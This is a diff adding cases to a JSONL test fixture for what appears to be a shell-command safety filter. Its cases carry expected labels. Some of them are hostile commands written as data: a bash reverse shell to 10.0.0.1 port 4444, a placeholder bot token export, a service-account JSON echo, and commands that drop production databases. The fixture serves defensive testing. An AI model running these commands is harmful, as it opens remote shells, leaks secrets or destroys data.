@@ -44,3 +44,7 @@
 {"id": "dest-18", "command": "psql -U postgres -h db.prod -c \"DROP DATABASE production;\"", "expected": "destructive_blocked"}
 {"id": "dest-19", "command": "mongosh --eval \"db.dropDatabase()\"", "expected": "destructive_blocked"}
 {"id": "safe-8", "command": "mysql -u root -p -e \"SELECT count(*) FROM users;\"", "expected": "pass_reflex"}
+{"id": "dlp-20", "command": "export TELEGRAM_BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ_12345678", "expected": "sensitive_rejected"}
+{"id": "dlp-21", "command": "echo '{\"type\": \"service_account\", \"project_id\": \"prod-app\"}'", "expected": "sensitive_rejected"}
+{"id": "dest-20", "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "expected": "destructive_blocked"}
+{"id": "safe-9", "command": "docker compose up -d", "expected": "pass_reflex"}
